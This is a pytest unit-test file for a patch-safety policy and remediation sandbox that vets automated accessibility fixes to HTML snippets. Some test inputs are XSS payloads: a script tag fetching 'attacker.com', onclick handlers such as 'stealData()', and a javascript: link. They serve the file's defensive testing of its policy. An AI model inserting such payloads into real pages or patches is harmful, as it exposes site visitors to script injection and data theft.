"""Unit tests for Phase 6 Remediation Sandbox and Patch Safety Policy."""

import pytest
from app.services.patch_policy import PatchPolicy
from app.services.remediation_sandbox import RemediationSandbox


def test_patch_policy_allows_safe_semantic_fixes():
    orig = "<img src='logo.png'>"
    safe_patch = "<img src='logo.png' alt='Acme Corporation Logo'>"
    allowed, reasons = PatchPolicy.evaluate(orig, safe_patch)
    assert allowed is True
    assert reasons == []

    orig_btn = "<div onclick='close()'>X</div>"
    safe_btn = "<button type='button' aria-label='Close dialog'>X</button>"
    allowed, reasons = PatchPolicy.evaluate(orig_btn, safe_btn)
    assert allowed is True
    assert reasons == []


def test_patch_policy_blocks_xss_and_scripts():
    orig = "<div>Content</div>"

    # Script tag
    bad_patch1 = "<div>Content</div><script>fetch('http://attacker.com')</script>"
    allowed, reasons = PatchPolicy.evaluate(orig, bad_patch1)
    assert allowed is False
    assert any("Forbidden tag <script>" in r for r in reasons)

    # Inline event handler
    bad_patch2 = "<button onclick='malicious()'>Submit</button>"
    allowed, reasons = PatchPolicy.evaluate(orig, bad_patch2)
    assert allowed is False
    assert any("Inline event handler 'onclick'" in r for r in reasons)

    # javascript: scheme
    bad_patch3 = "<a href='javascript:alert(1)'>Click Here</a>"
    allowed, reasons = PatchPolicy.evaluate(orig, bad_patch3)
    assert allowed is False
    assert any("Dangerous URL scheme 'javascript:'" in r for r in reasons)


def test_remediation_sandbox_accepts_valid_resolution():
    sandbox = RemediationSandbox()
    orig = "<img src='team.jpg'>"
    patch = "<img src='team.jpg' alt='Our engineering team collaborating'>"

    result = sandbox.evaluate_patch(
        finding_id="f-img-1",
        original_snippet=orig,
        candidate_patch=patch,
    )
    assert result.patch_accepted is True
    assert result.rejection_reason is None
    assert result.violations_before_count > result.violations_after_count
    assert result.new_violations_introduced == 0
    assert result.syntax_valid is True
    assert result.execution_time_ms >= 0.0


def test_remediation_sandbox_rejects_ineffective_patch():
    sandbox = RemediationSandbox()
    orig = "<img src='team.jpg'>"
    # Did not add alt attribute
    ineffective_patch = "<img src='team.jpg' class='styled-img'>"

    result = sandbox.evaluate_patch(
        finding_id="f-img-2",
        original_snippet=orig,
        candidate_patch=ineffective_patch,
    )
    assert result.patch_accepted is False
    assert "No resolution" in (result.rejection_reason or "")


def test_remediation_sandbox_rejects_policy_violation():
    sandbox = RemediationSandbox()
    orig = "<button>Click</button>"
    evil_patch = "<button onclick='stealData()'>Click</button>"

    result = sandbox.evaluate_patch(
        finding_id="f-btn-1",
        original_snippet=orig,
        candidate_patch=evil_patch,
    )
    assert result.patch_accepted is False
    assert "Policy violation" in (result.rejection_reason or "")


def test_remediation_sandbox_rejects_introduced_regressions():
    sandbox = RemediationSandbox()
    orig = "<img src='hero.jpg'>"
    # Adds alt, but also introduces a heading jump and empty button!
    regressive_patch = "<img src='hero.jpg' alt='Hero'><h3>Skipped heading</h3><button></button>"

    result = sandbox.evaluate_patch(
        finding_id="f-reg-1",
        original_snippet=orig,
        candidate_patch=regressive_patch,
    )
    assert result.patch_accepted is False
    assert result.new_violations_introduced > 0
    assert "Regression detected" in (result.rejection_reason or "")

